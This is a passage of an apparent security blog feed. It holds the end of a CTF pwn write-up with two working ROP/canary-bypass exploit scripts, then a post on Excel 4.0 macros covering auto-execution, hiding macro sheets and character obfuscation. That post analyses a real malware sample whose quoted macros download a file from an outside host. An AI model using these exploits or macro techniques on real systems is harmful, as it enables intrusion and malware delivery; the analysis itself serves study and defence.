so we don&#x27;t need to provide it here</span></span><br><span class="line">    payload += p64(<span class="number">0x400c03</span>) <span class="comment"># pop rdi; ret;</span></span><br><span class="line">    payload += p64(<span class="number">0</span>)        <span class="comment"># rdi &lt;= stdin</span></span><br><span class="line">    payload += p64(<span class="number">0x400c01</span>) <span class="comment"># pop rsi; pop r15; ret;</span></span><br><span class="line">    payload += p64(<span class="number">0x602030</span>) <span class="comment"># rsi &lt;= 0x602030 (somewhere in .bss)</span></span><br><span class="line">    payload += p64(<span class="number">0</span>)        <span class="comment"># r15 &lt;= garbage</span></span><br><span class="line">    payload += p64(<span class="number">0x4007e0</span>) <span class="comment"># jmp read@PLT</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># pivot rsp into somewhere in .bss</span></span><br><span class="line">    payload += p64(<span class="number">0x400bfd</span>) <span class="comment"># pop rsp; pop r13; pop r14; pop r15; ret</span></span><br><span class="line">    payload += p64(<span class="number">0x602030</span>) <span class="comment"># rsp &lt;= 0x602030 (somewhere in .bss)</span></span><br><span class="line"></span><br><span class="line">    p.send(</span><br><span class="line">        <span class="comment"># garbage to fill out the buffer up to canary</span></span><br><span class="line">        <span class="string">&#x27;a&#x27;</span> * (<span class="number">0x1010</span> - <span class="number">8</span>) + \</span><br><span class="line">        <span class="comment"># fake canary</span></span><br><span class="line">        <span class="string">&#x27;b&#x27;</span> * <span class="number">8</span> + \</span><br><span class="line">        <span class="comment"># saved rbp</span></span><br><span class="line">        <span class="string">&#x27;c&#x27;</span> * <span class="number">8</span> + \</span><br><span class="line">        <span class="comment"># return address + ROP chain</span></span><br><span class="line">        payload + \</span><br><span class="line">        <span class="comment"># garbage</span></span><br><span class="line">        <span class="string">&#x27;d&#x27;</span> * (<span class="number">2000</span> - <span class="built_in">len</span>(payload)) + \</span><br><span class="line">        <span class="comment"># replace thread&#x27;s stack guard with our fake canary</span></span><br><span class="line">        <span class="string">&#x27;b&#x27;</span> * <span class="number">8</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    <span class="comment"># here the content of atol@GOT is printed</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;It&#x27;s time to say goodbye.\n&quot;</span>)</span><br><span class="line">    libc_base = u64(p.recv(<span class="number">6</span>) + <span class="string">&#x27;\x00\x00&#x27;</span>) - <span class="number">0x36ea0</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;libc base: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    0x4526aexecve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span></span><br><span class="line"><span class="string">    constraints:</span></span><br><span class="line"><span class="string">        [rsp+0x30] == NULL</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    one_gadget = libc_base + <span class="number">0x4526a</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;one gadget: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(one_gadget))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># here we provide the final payload for exploitation</span></span><br><span class="line">    <span class="comment"># since rsp is pivoted, we provide the rest of data here</span></span><br><span class="line">    p.sendline(</span><br><span class="line">        <span class="comment"># pop r13; pop r14; pop r15; ret</span></span><br><span class="line">        <span class="comment"># writing garbage to r13, r14, and r15</span></span><br><span class="line">        p64(<span class="number">0</span>) * <span class="number">3</span> + \</span><br><span class="line">        <span class="comment"># after above ret, the shell will be executed</span></span><br><span class="line">        p64(one_gadget) + \</span><br><span class="line">        <span class="comment"># write enough zeros in order to satify [rsp+0x30] == NULL constraint</span></span><br><span class="line">        <span class="string">&#x27;\x00&#x27;</span> * <span class="number">0x40</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>POC2</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.23.so&quot;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">menu</span>(<span class="params"><span class="built_in">bytes</span>,data</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&quot;How many bytes do you want to send?\n&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(<span class="built_in">bytes</span>))</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    io.send(data)</span><br><span class="line"></span><br><span class="line">puts_plt = <span class="number">0x4007C0</span></span><br><span class="line">read_plt = <span class="number">0x4007E0</span> </span><br><span class="line">leave_addr = <span class="number">0x400A9B</span></span><br><span class="line"></span><br><span class="line">pop_rdi_addr = <span class="number">0x400c03</span></span><br><span class="line">puts_got = <span class="number">0x601FB0</span></span><br><span class="line">pop_rbp_addr = <span class="number">0x400870</span></span><br><span class="line">pop_rsi_addr = <span class="number">0x400c01</span></span><br><span class="line"></span><br><span class="line">bss_addr = <span class="number">0x602030</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./bs&#x27;</span>,env = &#123;<span class="string">&quot;LD_PRELOAD&quot;</span> : <span class="string">&quot;./libc-2.23.so&quot;</span>&#125;)</span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">payload = <span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x1010</span>+p64(bss_addr-<span class="number">0x8</span>)+p64(pop_rdi_addr) + p64(puts_got) + p64(puts_plt)</span><br><span class="line">payload += p64(pop_rdi_addr) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rsi_addr) + p64(bss_addr) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(read_plt) + p64(leave_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x2000</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">menu(<span class="number">0x2000</span>,payload)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;It\&#x27;s time to say goodbye.\n&#x27;</span>)</span><br><span class="line">base = u64(io.recv(<span class="number">6</span>)+<span class="string">&#x27;\x00\x00&#x27;</span>)-libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">io.send(p64(base+<span class="number">0xf1147</span>))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ã€Šctfç«èµ›æƒå¨æŒ‡å—ï¼ˆPWNç¯‡ï¼‰ã€‹</span><br><span class="line">https:&#x2F;&#x2F;ctf-wiki.org&#x2F;pwn&#x2F;linux&#x2F;mitigation&#x2F;canary&#x2F;</span><br><span class="line">https:&#x2F;&#x2F;www.jianshu.com&#x2F;p&#x2F;b0b254b94afe</span><br><span class="line">http:&#x2F;&#x2F;6par.top&#x2F;2020&#x2F;07&#x2F;05&#x2F;%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93&#x2F;</span><br><span class="line">http:&#x2F;&#x2F;www.int0x80.top&#x2F;BypassCanary&#x2F;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
        
        
    <summary type="html"></summary>
        
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Office Excel Macro</title>
    <link href="https://www.ascotbe.com/2021/01/27/OfficeExcelMacro/"/>
    <id>https://www.ascotbe.com/2021/01/27/OfficeExcelMacro/</id>
    <published>2021-01-27T10:45:42.000Z</published>
    <updated>2021-07-05T01:51:27.657Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>å£°æ˜</p></blockquote><p>éƒ‘é‡å£°æ˜ï¼šæ–‡ä¸­æ‰€æ¶‰åŠçš„æŠ€æœ¯ã€æ€è·¯å’Œå·¥å…·ä»…ä¾›ä»¥å®‰å…¨ä¸ºç›®çš„çš„å­¦ä¹ äº¤æµä½¿ç”¨ï¼Œä»»ä½•äººä¸å¾—å°†å…¶ç”¨äºéæ³•ç”¨é€”ä»¥åŠç›ˆåˆ©ç­‰ç›®çš„ï¼Œå¦åˆ™åæœè‡ªè¡Œæ‰¿æ‹…ï¼</p><blockquote><p>å‰è¨€</p></blockquote><p>å¥½ä¹…æ²¡ç¬¼ç»Ÿçš„å­¦ä¹ äº†ï¼Œæ¢³ç†ä¸‹Excelå®ç›¸å…³çš„ä¸œè¥¿ä»¥é˜²ä¸‹æ¬¡è¦ç”¨çš„æ—¶å€™éƒ½ä¸ä¼šã€‚</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/OfficeExcelMacro/1.png" alt="image-20210128134158060"></p><h3 id="å…³äºå®"><a href="#å…³äºå®" class="headerlink" title="å…³äºå®"></a>å…³äºå®</h3><p>æ®æˆ‘æ‰€çŸ¥å¾®è½¯officeæ‰€æ”¯æŒçš„å®é‡Œé¢ï¼Œç›®å‰æœ‰ä¸¤ç§</p><ul><li>1992å¹´ï¼šå¾®è½¯åœ¨officeä¸­å¼•ç”¨äº†åä¸ºExcel4.0çš„å®ä»£ç æŠ€æœ¯ï¼Œä¹Ÿè¢«æˆä¸ºXLMå®ã€‚Excel4.0å®ä»£ç å†™åœ¨è¡¨æ ¼ä¸­ï¼Œå®ä»£ç çš„å…·ä½“æ–‡ä»¶å‘ˆç°ä¸ºxmlè€Œä¸æ˜¯äºŒè¿›åˆ¶æ–‡ä»¶ã€‚</li><li>1993å¹´ï¼šå¾®è½¯æ›´æ–°äº†Excel5.0æŠ€æœ¯ï¼Œä¹Ÿå°±æ˜¯ç°åœ¨å¸¸è§çš„VBAå®ä»£ç ã€‚</li></ul><p>ä»Excel2010åˆ°Excel2019å…¨çº¿äº§å“éƒ½æ”¯æŒExcel4.0å®ã€‚åŒæ—¶å¾®è½¯ä¹Ÿæåˆ°ï¼Œè™½ç„¶ç›®å‰Microsoft Excelä»ç„¶æ”¯æŒExcel4.0å®ï¼Œä½†è¿˜æ˜¯å»ºè®®ç”¨æˆ·ä½¿ç”¨VBAå®ã€‚</p><h3 id="Macro-4-0"><a href="#Macro-4-0" class="headerlink" title="Macro 4.0"></a>Macro 4.0</h3><h4 id="ç®€å•åˆ©ç”¨"><a href="#ç®€å•åˆ©ç”¨" class="headerlink" title="ç®€å•åˆ©ç”¨"></a>ç®€å•åˆ©ç”¨</h4><p>åœ¨ç®­å¤´ä½ç½®ç‚¹å‡»å³é”®-&gt;æ’å…¥å³å¯ä½¿ç”¨</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/OfficeExcelMacro/2.png" alt="image-20210126164024520"></p><p>æ¥ç€ä¼šå‡ºç°ä¸€ä¸ªæ–°å»ºçš„å®è¡¨æ ¼ï¼Œæˆ‘ä»¬åœ¨è¡¨æ ¼ä¸­æ·»åŠ å¦‚ä¸‹å‘½ä»¤ï¼Œå³å¯å®Œæˆä¸€ä¸ªç®€å•çš„å®</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x3D;EXEC(&quot;calc.exe&quot;)</span><br><span class="line">&#x3D;ALERT(&quot;hello ascotbe~&quot;)</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/OfficeExcelMacro/3.gif" alt="1"></p><h4 id="éšè”½æ€§"><a href="#éšè”½æ€§" class="headerlink" title="éšè”½æ€§"></a>éšè”½æ€§</h4><p>å¯ä»¥è§åˆ°ä½¿ç”¨XLMå®æ¯”å¸¸è§çš„VBAå®å…·æœ‰æ›´å¥½çš„å…æ€æ€§ï¼Œä¸»è¦åŸå› XLMå®å’ŒVBAå®çš„è®¾è®¡ç†å¿µä¸åŒï¼Œå¯¼è‡´äº†å®ä»£ç åœ¨æ–‡ä»¶ç»“æ„ä¸­çš„å‘ˆç°ä¸åŒï¼Œå’ŒVBAå®ä¸€æ ·çš„æ˜¯ï¼Œåœ¨æ–‡ä»¶æ‰“å¼€æ—¶ï¼ŒExcelä¾æ—§ä¼šæé†’ç”¨æˆ·</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Because of your security settings, macros have been disabled. To run macros, you need to reopen this workbook, and then choose to enable macros. For more information about enabling macros, click Help.</span><br></pre></td></tr></table></figure><p>ä¸åŒçš„æ˜¯ï¼Œå½“ç”¨æˆ·å•å‡»å¯ç”¨ä¹‹åï¼ŒALT + F11æ‰“å¼€å®ä»£ç çª—å£ï¼Œå´å¹¶ä¸èƒ½çœ‹åˆ°å®ä»£ç ã€‚ä¹Ÿä¸èƒ½é€šè¿‡ä¸€äº›å¸¸è§çš„å®ä»£ç æå–å·¥å…·æ£€æµ‹åˆ†æå®ã€‚</p><p>è¿™æ˜¯å› ä¸ºé»˜è®¤æƒ…å†µä¸‹ï¼ŒXLMå®ä»£ç å­˜å‚¨åœ¨<code>ascotbe.xlsm\xl\Macrosheets\Sheet1.xml</code>ã€‚æ‰“å¼€è¯¥xmlæ–‡ä»¶ï¼Œå¯ä»¥æ¸…æ™°çš„çœ‹åˆ°åˆšæ‰åœ¨Excelå·¥ä½œè¡¨ä¸­æ’å…¥çš„å®ä»£ç ã€‚</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/OfficeExcelMacro/4.png" alt="image-20210126173824786"></p><h4 id="è‡ªåŠ¨åŠ è½½"><a href="#è‡ªåŠ¨åŠ è½½" class="headerlink" title="è‡ªåŠ¨åŠ è½½"></a>è‡ªåŠ¨åŠ è½½</h4><ul><li>Auto_Openï¼šåœ¨ç”¨æˆ·æ‰“å¼€æ–‡æ¡£çš„æ—¶å€™è‡ªåŠ¨è¿è¡Œï¼ˆå¦‚æœç”¨æˆ·å…è®¸æ‰§è¡Œå®ä»£ç ï¼‰</li><li>Auto_Closeï¼šåœ¨ç”¨æˆ·å…³é—­æ–‡æ¡£çš„æ—¶å€™è‡ªåŠ¨è¿è¡Œï¼ˆå¦‚æœç”¨æˆ·å…è®¸æ‰§è¡Œå®ä»£ç ï¼‰</li></ul><p>XLMå®åªéœ€è¦å°†éœ€è¦æ‰§è¡Œå®çš„å•å…ƒæ ¼åç§°è®¾ç½®ä¸ºAuto_Openæˆ–Auto_Closeå³å¯å®ç°å®ä»£ç çš„è‡ªåŠ¨åŠ è½½ã€‚</p><h5 id="è®¾ç½®å•å…ƒæ ¼åç§°"><a href="#è®¾ç½®å•å…ƒæ ¼åç§°" class="headerlink" title="è®¾ç½®å•å…ƒæ ¼åç§°"></a>è®¾ç½®å•å…ƒæ ¼åç§°</h5><p>ç‚¹å‡»ä¸€ä¸ªå•å…ƒæ ¼ï¼Œç„¶åé€‰ç€å…¬å¼-&gt;å®šä¹‰çš„åç§°-&gt;å®šä¹‰åç§°å³å¯è®¾ç½®æˆåŠŸ</p><h5 id="æ¼”ç¤º"><a href="#æ¼”ç¤º" class="headerlink" title="æ¼”ç¤º"></a>æ¼”ç¤º</h5><p>æ²¡æœ‰è®¾ç½®Auto_Closeå…³é—­æ–‡æ¡£ï¼Œå¯ä»¥çœ‹åˆ°æ— ä»»ä½•ååº”ï¼Œå½“æˆ‘ä»¬è®¾ç½®äº†ä»¥åå…³é—­ï¼Œå¼¹å‡ºäº†è®¡ç®—å™¨å’Œå¼¹çª—</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/OfficeExcelMacro/5.gif" alt="2"></p><h4 id="éšè—æ–¹å¼"><a href="#éšè—æ–¹å¼" class="headerlink" title="éšè—æ–¹å¼"></a>éšè—æ–¹å¼</h4><h5 id="ç®€å•çš„éšè—"><a href="#ç®€å•çš„éšè—" class="headerlink" title="ç®€å•çš„éšè—"></a>ç®€å•çš„éšè—</h5><p>å·¦ä¸‹è§’éšè—ï¼Œå¯ä»¥é€šè¿‡å³é”®-&gt;å–æ¶ˆéšè—æ¥æ˜¾ç¤º</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/OfficeExcelMacro/6.png" alt="image-20210127104310071"></p><p>åˆ—éšè—ï¼Œå¯ä»¥çœ‹åˆ°æ­£å¸¸éƒ½æ˜¯ä»A1å¼€å§‹çš„è¡¨æ ¼ï¼Œéšè—äº†åˆ—ä»¥åå˜æˆäº†ä»D1å¼€å§‹äº†ï¼Œå¹¶ä¸”è¿›åº¦æ¡æ˜¯æ‹‰å€’æœ€å·¦è¾¹çš„</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/OfficeExcelMacro/7.png" alt="image-20210127104449564"></p><h5 id="è¿›åˆ¶éšè—"><a href="#è¿›åˆ¶éšè—" class="headerlink" title="è¿›åˆ¶éšè—"></a>è¿›åˆ¶éšè—</h5><p>è¿™ç§éšè—æ–¹å¼å¦‚æœä½¿ç”¨<code>xlsm</code>åç¼€æ ¼å¼çš„è¯æ˜¯æ— æ³•åˆ©ç”¨çš„ï¼Œä½†æ˜¯xlsæ ¼å¼æ˜¯å¯ä»¥çš„ï¼Œé€šè¿‡å…¨å±€æœç´¢å­—ç¬¦ä¸²<code>sheet1</code>æ‰¾åˆ°åé¢åå…­è¿›åˆ¶æ˜¯<strong>85 00</strong>å¼€å¤´çš„ä½ç½®ï¼Œç„¶åå¾€åæ•°ä¹ä¸ªå­—èŠ‚ï¼Œå¯ä»¥çœ‹åˆ°æ¡†èµ·æ¥çš„æœ€åä¸€ä¸ªå­—èŠ‚æ˜¯01</p><ul><li>00:è¡¨ç¤ºä¸éšè—</li><li>01:è¡¨ç¤ºæµ…éšè—ï¼ˆå¯é€šè¿‡é¼ æ ‡å³é”®å–æ¶ˆéšè—ï¼‰</li><li>02:è¡¨ç¤ºæ·±åº¦éšè—ï¼ˆæ— æ³•åœ¨Excelä¸­æ‰¾åˆ°ï¼‰</li></ul><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/OfficeExcelMacro/8.png" alt="image-20210127181124488"></p><p>å…·ä½“æ•ˆæœå¯ä»¥çœ‹å›¾</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/OfficeExcelMacro/9.gif" alt="3"></p><h4 id="ä¸€ä¸ªæ¡ˆä¾‹"><a href="#ä¸€ä¸ªæ¡ˆä¾‹" class="headerlink" title="ä¸€ä¸ªæ¡ˆä¾‹"></a>ä¸€ä¸ªæ¡ˆä¾‹</h4><p>æ ·æœ¬ä¸‹è½½åœ°å€<a href="https://app.any.run/tasks/aaf8a9aa-5068-42dd-89cf-cd610ce5e730/">ç‚¹æˆ‘</a>ï¼Œå¤‡ä»½åœ°å€<a href="https://raw.staticdn.net/Ascotbe/Random-img/master/OfficeExcelMacro/Info_695.xls.zip">ä¸‹è½½</a>ï¼Œä¸‹é¢æ˜¯æ ·æœ¬çš„æˆªå›¾</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/OfficeExcelMacro/10.png" alt="img"></p><h5 id="å¦‚ä½•å®šä½è¯¥æ ·æœ¬çš„éšè—å®ä½ç½®"><a href="#å¦‚ä½•å®šä½è¯¥æ ·æœ¬çš„éšè—å®ä½ç½®" class="headerlink" title="å¦‚ä½•å®šä½è¯¥æ ·æœ¬çš„éšè—å®ä½ç½®"></a>å¦‚ä½•å®šä½è¯¥æ ·æœ¬çš„éšè—å®ä½ç½®</h5><p>ä¸‹è½½é¡¹ç›®</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;DidierStevens&#x2F;DidierStevensSuite</span><br></pre></td></tr></table></figure><p>ç„¶åæ‰§è¡Œä»¥ä¸‹å‘½ä»¤</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python oledump.py -p plugin_biff.py --pluginoptions &quot;-o BOUNDSHEET -a&quot; &#x2F;Users&#x2F;ascotbe&#x2F;Downloads&#x2F;Info_695.xls</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/OfficeExcelMacro/12.png" alt="image-20210308143858216"></p><p>å¯ä»¥çœ‹åˆ°å®šä½åˆ°äº†å®çš„ä½ç½®<strong>D0 66 02 00 02 01 0A 00</strong>ï¼Œåªéœ€è¦ä¿®æ”¹ç¬¬5ä¸ªå­—èŠ‚ä½ç½®çš„02å³å¯æ‰“å¼€æ·±åº¦éšè—å®</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/OfficeExcelMacro/13.png" alt="image-20210308144106093"></p><h5 id="æ ·æœ¬åˆ†æ"><a href="#æ ·æœ¬åˆ†æ" class="headerlink" title="æ ·æœ¬åˆ†æ"></a>æ ·æœ¬åˆ†æ</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x3D;IF(GET.WORKSPACE(19),,CLOSE(TRUE))#æ£€æŸ¥æ˜¯å¦å­˜åœ¨é¼ æ ‡ï¼Œå¦‚æœGET.WORKSPACEè·å–çš„å€¼ä¸ºfalseçš„è¯ï¼Œå°±æ‰§è¡ŒCLOSEä¿å­˜å…³é—­è¡¨æ ¼ã€‚ifå‡½æ•°ç¬¬äºŒä¸ªå‚æ•°æ˜¯åˆ¤æ–­ç¬¬ä¸€ä¸ªå‚æ•°è¿”å›å€¼ä¸ºtureæ‰§è¡Œä½ç½®ï¼Œç¬¬ä¸‰ä¸ªå‚æ•°æ˜¯åˆ¤æ–­ç¬¬ä¸€ä¸ªå‚æ•°è¿”å›å€¼ä¸ºfalseæ‰§è¡Œä½ç½®</span><br><span class="line">&#x3D;IF(GET.WORKSPACE(42),,CLOSE(TRUE))#è®¡ç®—æœºæ˜¯å¦èƒ½å¤Ÿæ’­æ”¾å£°éŸ³</span><br><span class="line">&#x3D;IF(ISNUMBER(SEARCH(&quot;Windows&quot;,GET.WORKSPACE(1))), ,CLOSE(TRUE))#æ£€æŸ¥è¿è¡ŒMicrosoft Excelçš„ç¯å¢ƒï¼Œç„¶åæ£€æŸ¥ç¯å¢ƒçš„ç‰ˆæœ¬å·</span><br></pre></td></tr></table></figure><p>å¦‚æœè¿™ä¸‰ä¸ªæ˜¯æ­£ç¡®çš„ï¼Œåˆ™å°†Excelå®‰å…¨æ³¨å†Œè¡¨é¡¹å¤åˆ¶åˆ°<strong>C:\Users\public\1.reg</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x3D;CALL(&quot;Shell32&quot;,&quot;ShellExecuteA&quot;,&quot;JJCCCJJ&quot;,0,&quot;open&quot;,&quot;C:\Windows\system32\reg.exe&quot;,&quot;EXPORT HKCU\Software\Microsoft\Office\&quot;&amp;GET.WORKSPACE(2)&amp;&quot;\Excel\Security c:\users\public\1.reg &#x2F;y&quot;,0,5)</span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥ï¼Œå®ƒç­‰å¾…ä¸‰ç§’é’Ÿã€‚ç„¶åå®ƒæ‰“å¼€1.regï¼Œä»å­—èŠ‚ä½ç½®215å¼€å§‹ï¼Œå¹¶è¯»å–æ¥ä¸‹æ¥çš„255ä¸ªå­—èŠ‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x3D;WAIT(NOW()+&quot;00:00:03&quot;)</span><br><span class="line">&#x3D;FOPEN(&quot;c:\users\public\1.reg&quot;)</span><br><span class="line">&#x3D;FPOS(Q10, 215)</span><br><span class="line">&#x3D;FREAD(Q10, 255)</span><br></pre></td></tr></table></figure><p>æå–å‡ºæ¥çš„<a href="https://app.any.run/tasks/aaf8a9aa-5068-42dd-89cf-cd610ce5e730/">1.reg</a>å†…å®¹</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/OfficeExcelMacro/11.png" alt="image-20210308180750093"></p><p>1.regè¢«å…³é—­å¹¶åˆ é™¤ã€‚ç„¶åå®ƒåœ¨è¯»å–çš„å†…å®¹ï¼ˆå­˜å‚¨åœ¨å•å…ƒæ ¼Q12ä¸­ï¼‰ä¸­æœç´¢å­—ç¬¦ä¸²â€œ 0001â€ã€‚è¿™æ˜¯ç¬¬äºŒæ¬¡æµ‹è¯•ï¼Œçœ‹å®ƒæ˜¯å¦åœ¨æ²™ç®±ä¸­ã€‚å¦‚æœæ‰¾åˆ°è¯¥å­—ç¬¦ä¸²ï¼Œå®ƒå°†å…³é—­ç”µå­è¡¨æ ¼ã€‚å¦‚æœæ‰¾ä¸åˆ°å­—ç¬¦ä¸²â€œ 0001â€ï¼Œå®ƒå°†å°è¯•ä¸‹è½½æ–‡ä»¶å¹¶å°†å…¶å¦å­˜ä¸º.htmlæ–‡ä»¶åœ¨**C:\Users\Public\**ä¸­ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x3D;FCLOSE(Q10)</span><br><span class="line">&#x3D;FILE.DELETE(&quot;c:\users\public\1.reg&quot;)</span><br><span class="line">&#x3D;IF(ISNUMBER(SEARCH(&quot;0001&quot;,Q12)),CLOSE(FALSE),)</span><br><span class="line">&#x3D;CALL(&quot;urlmon&quot;,&quot;URLDownloadToFileA&quot;,&quot;JJCCJJ&quot;,0,&quot;https:&#x2F;&#x2F;efbzfyvsb.website&#x2F;f2f23&quot;,&quot;c:\Users\Public\b7gf5yk.html&quot;,0,0)</span><br></pre></td></tr></table></figure><p>å®Œæ•´çš„è‹±æ–‡è¯­æ³•æ–‡æ¡£<a href="https://raw.staticdn.net/Ascotbe/Random-img/master/OfficeExcelMacro/Excel4.0MacroFunctionsReference.pdf">ä¸‹è½½</a>ï¼Œä¸­æ–‡ç‰ˆ<a href="https://raw.staticdn.net/Ascotbe/Random-img/master/OfficeExcelMacro/MacrofunCn.hlp">ä¸‹è½½</a>ï¼Œä¸€ä¸ªåœ¨çº¿çš„Excel xmlå®å‡½æ•°<a href="http://www.cpearson.com/excel/call.htm">æ–‡æ¡£</a>é‡Œé¢æ¯”å®˜ç½‘æ–‡æ¡£å…¨é¢</p><p>å…³äºæ³¨å†Œè¡¨regæ–‡ä»¶çš„è§£é‡Šå‚è€ƒè¿™ç¯‡<a href="https://www.cnblogs.com/fczjuever/archive/2013/04/09/3010711.html">åšå®¢</a></p><p>æœ€åè´´ä¸Šä»£ç è½¬ASCIIä»£ç </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a=<span class="string">&quot;&quot;&quot;xxx&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    <span class="comment">#print(ord(i))</span></span><br><span class="line">    print(<span class="string">&quot;=CHAR(&quot;</span>+<span class="built_in">str</span>(<span class="built_in">ord</span>(i))+<span class="string">&quot;)&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="Macro-5-0"><a href="#Macro-5-0" class="headerlink" title="Macro 5.0"></a>Macro 5.0</h3><p>å…³äºVBAå®çš„åˆ¶ä½œè¿™é‡Œå°±ä¸æ¦‚è¿°äº†ï¼Œå¯ä»¥å‚è€ƒä¹‹å‰çš„<a href="https://www.ascotbe.com/2020/07/26/office_0x01/#Office%E5%AE%8F">æ–‡ç« </a>ï¼Œå¯ä»¥çœ‹åˆ°wordå’Œexcelçš„vbaå®æ˜¯é€šç”¨çš„</p><h3 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;clickallthethings.wordpress.com&#x2F;2020&#x2F;04&#x2F;06&#x2F;covid-19-excel-4-0-macros-and-sandbox-detection&#x2F;</span><br><span class="line">https:&#x2F;&#x2F;www.yuque.com&#x2F;p1ut0&#x2F;qtmgyx&#x2F;rqank4</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
        
        
    <summary type="html"></summary>
        
      
    
    
    
    
  </entry>
  
  <entry>
